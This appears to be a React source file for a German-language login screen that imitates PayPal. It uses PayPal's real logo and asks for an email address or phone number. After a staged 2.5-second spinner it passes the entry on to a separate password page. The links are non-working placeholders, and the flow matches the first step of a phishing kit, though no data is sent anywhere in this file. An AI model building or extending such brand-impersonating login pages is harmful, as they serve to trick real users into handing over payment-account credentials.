import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'motion/react';
import PayPalInput from '../components/PayPalInput';
import { Loader2 } from 'lucide-react';

export default function LoginEmail() {
  const [identifier, setIdentifier] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const validate = (value: string) => {
    const isEmail = value.includes('@');
    const isPhone = /^(0151|0163|017|015|016|\+49)/.test(value);
    
    if (!isEmail && !isPhone) {
      return 'Geben Sie eine gültige E-Mail-Adresse oder Handynummer ein.';
    }
    return '';
  };

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    const validationError = validate(identifier);
    if (validationError) {
      setError(validationError);
      return;
    }

    setError('');
    setIsLoading(true);
    
    setTimeout(() => {
      setIsLoading(false);
      navigate('/login-password', { state: { email: identifier } });
    }, 2500);
  };

  return (
    <div className="w-full max-w-[460px] mx-auto px-6 py-12 md:py-20 relative">
      <AnimatePresence>
        {isLoading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 z-50 flex items-center justify-center bg-[var(--color-app-bg)]/80 backdrop-blur-[2px]"
          >
            <Loader2 className="w-12 h-12 text-primary animate-spin" />
          </motion.div>
        )}
      </AnimatePresence>

      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-3xl p-8 md:p-10 text-center shadow-sm border border-slate-100"
      >
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" 
            alt="PayPal Logo" 
            className="h-10"
            referrerPolicy="no-referrer"
          />
        </div>

        <form onSubmit={handleNext} className="space-y-6">
          <div className="space-y-2 text-left">
            <PayPalInput 
              label="E-Mail-Adresse oder Handynummer"
              value={identifier}
              onChange={(e) => {
                setIdentifier(e.target.value);
                if (error) setError('');
              }}
              required
              autoFocus
              className={error ? "border-red-600 ring-red-100" : ""}
            />
            {error && <p className="text-red-600 text-[13px] font-medium px-1">{error}</p>}
          </div>

          <div className="text-left font-bold">
            <a href="#" className="text-[14px] text-secondary hover:underline">
              E-Mail-Adresse vergessen?
            </a>
          </div>

          <button 
            type="submit"
            disabled={isLoading}
            className="w-full bg-primary text-white font-bold py-3 px-6 rounded-full transition-all hover:bg-secondary disabled:opacity-50"
          >
            Weiter
          </button>
        </form>

        <div className="mt-8 pt-8 border-t border-slate-100 flex items-center justify-center gap-4">
          <span className="text-slate-500 text-sm">oder</span>
        </div>

        <button 
          className="mt-8 w-full border border-slate-300 text-text-main font-bold py-3 px-6 rounded-full transition-all hover:bg-slate-50"
        >
          Neu anmelden
        </button>

        <div className="mt-8 flex justify-center gap-4 text-[13px] font-bold text-secondary">
          <a href="#" className="hover:underline">Deutsch</a>
          <span className="text-slate-300 font-normal">|</span>
          <a href="#" className="hover:underline">English</a>
        </div>
      </motion.div>
    </div>
  );
}
